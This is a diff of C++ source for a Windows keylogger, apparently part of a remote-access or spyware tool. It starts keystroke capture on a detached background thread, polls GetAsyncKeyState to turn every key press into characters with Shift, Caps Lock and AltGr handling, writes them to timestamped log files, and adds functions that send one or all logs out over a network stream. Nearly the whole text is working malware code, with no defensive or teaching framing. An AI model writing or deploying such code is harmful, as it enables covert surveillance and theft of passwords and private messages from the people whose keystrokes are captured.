@@ -1,106 +1,112 @@
 #include "KeyLogger.h"
 
-
+void KeyLogger::tryStart(){
+    if (!recordingKeys.load()){
+        recordingKeys=true;
+        std::thread keyloggerThread(&KeyLogger::start, this);
+        keyloggerThread.detach();
+    }
+}
 
 void KeyLogger::start() {
     while (recordingKeys.load()) {
-       int shift = checkShift();
-       int cap = GetKeyState(VK_CAPITAL);
-       int altC = checkAltGr();
+        int shift = checkShift();
+        int cap = GetKeyState(VK_CAPITAL);
+        int altC = checkAltGr();
 
 
-       if (GetAsyncKeyState(VK_SPACE) & 0x0001) {
-           writeCharIntoLogFile(' ');
-       } else if (GetAsyncKeyState(VK_LCONTROL) & 0x0001){
-           writeCharIntoLogFile("[LEFT-CONTROL]");
-       } else if (GetAsyncKeyState(VK_RCONTROL) & 0x0001){
-           writeCharIntoLogFile("[RIGHT-CONTROL]");
-       } else {
-           for (int i = 48; i <= 250; i++) {
-               if (GetAsyncKeyState(i) & 0x0001) {
-                   switch (i) {
-                       case 48:
-                           if (shift)writeCharIntoLogFile("=");
-                           else if (altC); else writeCharIntoLogFile("0");
-                           break;
-                       case 49:
-                           if (shift)writeCharIntoLogFile("!");
-                           else if (altC) writeCharIntoLogFile("|"); else writeCharIntoLogFile("1");
-                           break;
-                       case 50:
-                           if (shift)writeCharIntoLogFile("\"");
-                           else if (altC) writeCharIntoLogFile("@"); else writeCharIntoLogFile("2");
-                           break;
-                       case 51:
-                           if (shift)writeCharIntoLogFile((char) 250);
-                           else if (altC) writeCharIntoLogFile("#"); else writeCharIntoLogFile("3");
-                           break;
-                       case 52:
-                           if (shift)writeCharIntoLogFile("$");
-                           else if (altC) writeCharIntoLogFile("~"); else writeCharIntoLogFile("4");
-                           break;
-                       case 53:
-                           (shift) ? writeCharIntoLogFile("%"): writeCharIntoLogFile("5");
-                           break;
-                       case 54:
-                           if (shift)writeCharIntoLogFile("&");
-                           else if (altC) writeCharIntoLogFile(char(172)); else writeCharIntoLogFile("6");
-                           break;
-                       case 55:
-                           shift ? writeCharIntoLogFile("/") : writeCharIntoLogFile("7");
-                           break;
-                       case 56:
-                           shift ? writeCharIntoLogFile("(") : writeCharIntoLogFile("8");
-                           break;
-                       case 57:
-                           shift ? writeCharIntoLogFile(")") : writeCharIntoLogFile("9");
-                           break;
-                       case 65 ... 90:    // Alphabet
-                           (shift && !cap || !shift && cap) ?
-                           writeCharIntoLogFile((char) (i) ):
-                           writeCharIntoLogFile((char) (i + 32));
-                           break;
-                       case 186:
-                           if (shift) writeCharIntoLogFile("^");
-                           else if (altC) writeCharIntoLogFile("["); else writeCharIntoLogFile("`");
-                           break;
-                       case 187:
-                           if (shift) writeCharIntoLogFile("*");
-                           else if (altC) writeCharIntoLogFile("]"); else writeCharIntoLogFile("+");
-                           break;
-                       case 188:
-                           (shift) ? writeCharIntoLogFile(";") : writeCharIntoLogFile(",");
-                           break;
-                       case 189:
-                           (shift) ? writeCharIntoLogFile("_") : writeCharIntoLogFile("-");
-                           break;
-                       case 190:
-                           (shift) ? writeCharIntoLogFile(":") : writeCharIntoLogFile(".");
-                           break;
-                       case 191:
-                           if (shift && !cap || !shift && cap) writeCharIntoLogFile(char(128));
-                           else if (altC) writeCharIntoLogFile(char(125)); else writeCharIntoLogFile(char(135));
-                           break;
-                       case 192:
-                           (shift && !cap || !shift && cap) ?
-                           writeCharIntoLogFile((char) 165 ):
-                           writeCharIntoLogFile((char) 164);
-                           break;
-                       case 220:
-                           if (shift) writeCharIntoLogFile(char(166));
-                           else if (altC)writeCharIntoLogFile(char(92)); else writeCharIntoLogFile(char(220));
-                           break;
-                       case 222:
-                           if (shift) writeCharIntoLogFile(char(249));
-                           else if (altC) writeCharIntoLogFile("{"); else writeCharIntoLogFile(char(239));
-                           break;
-                       default:
-                           break;
-                   }
+        if (GetAsyncKeyState(VK_SPACE) & 0x0001) {
+            writeCharIntoLogFile(' ');
+        } else if (GetAsyncKeyState(VK_LCONTROL) & 0x0001) {
+            writeCharIntoLogFile("[LEFT-CONTROL]");
+        } else if (GetAsyncKeyState(VK_RCONTROL) & 0x0001) {
+            writeCharIntoLogFile("[RIGHT-CONTROL]");
+        } else {
+            for (int i = 48; i <= 250; i++) {
+                if (GetAsyncKeyState(i) & 0x0001) {
+                    switch (i) {
+                        case 48:
+                            if (shift)writeCharIntoLogFile("=");
+                            else if (altC); else writeCharIntoLogFile("0");
+                            break;
+                        case 49:
+                            if (shift)writeCharIntoLogFile("!");
+                            else if (altC) writeCharIntoLogFile("|"); else writeCharIntoLogFile("1");
+                            break;
+                        case 50:
+                            if (shift)writeCharIntoLogFile("\"");
+                            else if (altC) writeCharIntoLogFile("@"); else writeCharIntoLogFile("2");
+                            break;
+                        case 51:
+                            if (shift)writeCharIntoLogFile((char) 250);
+                            else if (altC) writeCharIntoLogFile("#"); else writeCharIntoLogFile("3");
+                            break;
+                        case 52:
+                            if (shift)writeCharIntoLogFile("$");
+                            else if (altC) writeCharIntoLogFile("~"); else writeCharIntoLogFile("4");
+                            break;
+                        case 53:
+                            (shift) ? writeCharIntoLogFile("%") : writeCharIntoLogFile("5");
+                            break;
+                        case 54:
+                            if (shift)writeCharIntoLogFile("&");
+                            else if (altC) writeCharIntoLogFile(char(172)); else writeCharIntoLogFile("6");
+                            break;
+                        case 55:
+                            shift ? writeCharIntoLogFile("/") : writeCharIntoLogFile("7");
+                            break;
+                        case 56:
+                            shift ? writeCharIntoLogFile("(") : writeCharIntoLogFile("8");
+                            break;
+                        case 57:
+                            shift ? writeCharIntoLogFile(")") : writeCharIntoLogFile("9");
+                            break;
+                        case 65 ... 90:    // Alphabet
+                            (shift && !cap || !shift && cap) ?
+                            writeCharIntoLogFile((char) (i)) :
+                            writeCharIntoLogFile((char) (i + 32));
+                            break;
+                        case 186:
+                            if (shift) writeCharIntoLogFile("^");
+                            else if (altC) writeCharIntoLogFile("["); else writeCharIntoLogFile("`");
+                            break;
+                        case 187:
+                            if (shift) writeCharIntoLogFile("*");
+                            else if (altC) writeCharIntoLogFile("]"); else writeCharIntoLogFile("+");
+                            break;
+                        case 188:
+                            (shift) ? writeCharIntoLogFile(";") : writeCharIntoLogFile(",");
+                            break;
+                        case 189:
+                            (shift) ? writeCharIntoLogFile("_") : writeCharIntoLogFile("-");
+                            break;
+                        case 190:
+                            (shift) ? writeCharIntoLogFile(":") : writeCharIntoLogFile(".");
+                            break;
+                        case 191:
+                            if (shift && !cap || !shift && cap) writeCharIntoLogFile(char(128));
+                            else if (altC) writeCharIntoLogFile(char(125)); else writeCharIntoLogFile(char(135));
+                            break;
+                        case 192:
+                            (shift && !cap || !shift && cap) ?
+                            writeCharIntoLogFile((char) 165) :
+                            writeCharIntoLogFile((char) 164);
+                            break;
+                        case 220:
+                            if (shift) writeCharIntoLogFile(char(166));
+                            else if (altC)writeCharIntoLogFile(char(92)); else writeCharIntoLogFile(char(220));
+                            break;
+                        case 222:
+                            if (shift) writeCharIntoLogFile(char(249));
+                            else if (altC) writeCharIntoLogFile("{"); else writeCharIntoLogFile(char(239));
+                            break;
+                        default:
+                            break;
+                    }
 
-               }
-           }
-       }
+                }
+            }
+        }
     }
 }
 
@@ -111,7 +117,7 @@ bool KeyLogger::checkAltGr() {
     return false;
 }
 
-void KeyLogger::writeCharIntoLogFile(const char * string) {
+void KeyLogger::writeCharIntoLogFile(const char *string) {
     if (!std::filesystem::exists(pathOfLogs)) std::filesystem::create_directory(pathOfLogs);
     std::ofstream myfile;
     myfile.open(logsFileName.c_str(), std::fstream::app);
@@ -166,11 +172,29 @@ KeyLogger::KeyLogger(Stream stream) : stream(stream) {
 
 }
 
-std::wstring KeyLogger::generateLogName(){
-    return pathOfLogs+L"log_"+Time::getCurrentDateTimeW()+L".log";
+std::wstring KeyLogger::generateLogName() {
+    return pathOfLogs + L"log_" + Time::getCurrentDateTimeW() + L".log";
 }
 
-void KeyLogger::sendKeyLoggerLogs(){
+bool KeyLogger::lastLogExists(){
+    return std::filesystem::exists(logsFileName);
+}
+
+bool KeyLogger::logsExists(){
+    if (std::filesystem::exists(pathOfLogs) && !std::filesystem::is_empty(pathOfLogs)) return true;
+    return false;
+}
+
+void KeyLogger::sendKeyLoggerLog() {
     stream.sendFile(logsFileName.c_str());
     logsFileName = generateLogName();
+}
+
+void KeyLogger::sendAllKeyLoggerLogs() const {
+    for (const auto &entry: std::filesystem::directory_iterator(pathOfLogs)) {
+        stream.sendSize(0);
+        if (std::filesystem::is_regular_file(entry)) stream.sendFile(entry.path().wstring().c_str());
+        stream.readSize();
+    }
+    stream.sendSize(-1);
 }
